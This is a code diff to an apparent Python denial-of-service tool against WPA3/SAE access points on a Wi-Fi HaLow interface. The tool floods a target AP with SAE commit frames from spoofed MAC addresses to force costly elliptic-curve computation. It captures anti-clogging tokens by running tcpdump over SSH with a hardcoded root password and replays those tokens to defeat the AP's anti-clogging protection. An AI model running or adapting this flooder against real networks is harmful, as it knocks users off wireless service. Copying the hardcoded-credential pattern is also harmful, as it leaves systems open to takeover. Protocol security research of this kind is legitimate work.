@@ -6,42 +6,40 @@ from attack.frames.sae_commit_frame import commit_frame
 import threading
 import subprocess
 import json
-import select
 import queue
 
-cookie_queue = queue.Queue()
+#cookie_queue = queue.Queue()
 time_filter = f'frame.time >= "{time.time()}""'
 pcap = None
+
+mac_cookie_map = {}
 
 stop_track = threading.Event()
 lock = threading.Lock()
 
-
-
 def _track_cookie():
-    global cookie_queue
+    global mac_cookie_map
+    track_cmd = ["sshpass", "-p", "halow", "ssh", "root@10.42.0.1", "tcpdump", "-i", "morse0", "-u", "-s0", "-w", "-", "# LIVE_TOKEN_TRACKER"]
 
     #keep track of mac addresses
     #we do not want to resent mac that has already been processed
-    seen_macs = set()
+    #seen_macs = set()
 
-    track_cmd = ["sshpass", "-p", "halow", "ssh", "root@10.42.0.1", "tcpdump", "-i", "morse0", "-u", "-s0", "-w", "-", "# LIVE_TOKEN_TRACKER"]
+    buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=1024)
 
-    buf = subprocess.Popen(track_cmd,stdout=subprocess.PIPE, stderr=subprocess.PIPE,bufsize=4096)
-    
     tshark = subprocess.Popen(
         [
             "tshark",
             "-r", "-",
             "-Y", "wlan.fixed.anti_clogging_token",
-            "-T", "ek",
-            "-l"
+            "-T", "ek"
         ],
         stdin=buf.stdout,
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE,
         text=True
     )
+
     stdout = tshark.stdout
     # loop through the output of stdout
 
@@ -53,7 +51,6 @@ def _track_cookie():
             continue
         
         packet = json.loads(line)
-        
 
         random_mac = None
         ap_mac = None
@@ -64,14 +61,18 @@ def _track_cookie():
                 random_mac = packet["layers"]["wlan"]["wlan_wlan_ra"]
             if "wlan_wlan_mgt" in packet["layers"]:
                 cookie = bytes.fromhex(packet["layers"]["wlan_wlan_mgt"]["wlan_wlan_fixed_anti_clogging_token"].replace(":",""))
-        if random_mac is not None and cookie is not None and ap_mac is not None:
-            if random_mac not in seen_macs:
-                seen_macs.add(random_mac)
-                cookie_queue.put((ap_mac,random_mac,cookie))
+
+        if (random_mac is not None and random_mac in mac_cookie_map.keys()) and cookie is not None and ap_mac is not None:
+            if mac_cookie_map[random_mac] != cookie:
+                with lock:
+                    mac_cookie_map[random_mac] = cookie
+            #if random_mac not in seen_macs:
+            #    seen_macs.add(random_mac)
+            #    cookie_queue.put((ap_mac,random_mac,cookie))
 
         #periodically clear seen macs
-        if len(seen_macs) > 10000:
-            seen_macs.clear()
+        #if len(seen_macs) > 10000:
+        #    seen_macs.clear()
 
     #terminate subprocesses
     tshark.terminate()
@@ -89,31 +90,31 @@ def random_mac():
     rest = [random.randint(0, 255) for _ in range(5)]
     return ':'.join(f'{b:02x}' for b in [first] + rest)
 
-def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16):
+def flood_sae_commits(ap_mac:str, duration:int=200, rate:float=16, mac_no:int=20):
     """
     Send 'count' SAE commit frames from random STA MACs to the given AP MAC.
     Each frame forces the AP to run hash-to-curve (expensive ECC operation).
     """
-    print(f"[*] Flooding {ap_mac} with a rate of {rate} SAE commit frames")
+    global mac_cookie_map
+
+    print(f"[*] Flooding {ap_mac} at a rate of {rate} SAE commit frames per second with {mac_no} spoof frames")
     start_time = time.time()
     frame_bytes = None
-    test = 0
-    test_time = time.time()
-    while time.time()- start_time < duration:
-        try:
-            q_ap_mac, q_random_mac, q_cookie = cookie_queue.get_nowait()
-            frame_bytes = commit_frame(target_mac=q_ap_mac, src_mac=q_random_mac,cookie=q_cookie)
-        except queue.Empty:        
-            src = random_mac()
-            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src)
+    random_macs = [random_mac() for _ in range(mac_no)]
+    with lock:
+        mac_cookie_map = {mac: None for mac in random_macs}
     
+    while time.time()- start_time < duration:
+    #    try:
+    #        q_ap_mac, q_random_mac, q_cookie = cookie_queue.get_nowait()
+    #        frame_bytes = commit_frame(target_mac=q_ap_mac, src_mac=q_random_mac,cookie=q_cookie)
+    #    except queue.Empty:        
+    #        src = random_mac()
+    #        frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src)
+        src = random.choice(random_macs)
+        with lock:
+            frame_bytes = commit_frame(target_mac=ap_mac, src_mac=src,cookie=mac_cookie_map[src])
         transmitData(frame_bytes)
-        test += 1
-        if test == rate:
-            print("time elapsed in seconds: ", time.time() - test_time)
-            print("transmitted: ", test, " frames")
-            test = 0
-            test_time = time.time()
         time.sleep(1/rate)
 
 def start_dos():
@@ -129,11 +130,12 @@ def start_dos():
     #set the durations
     duration = int(input("Duration of attack (in seconds): "))
     rate = float(input("enter rate of frames to transmit: "))
+    mac_no = int(input("enter the number of spoofed frames to be used: "))
 
     stop_track.clear()
     threading.Thread(target=_track_cookie,daemon=True).start()
 
-    flood_sae_commits(ap_mac, duration, rate)
+    flood_sae_commits(ap_mac, duration, rate, mac_no)
 
     #stop threading
     stop_track.set()
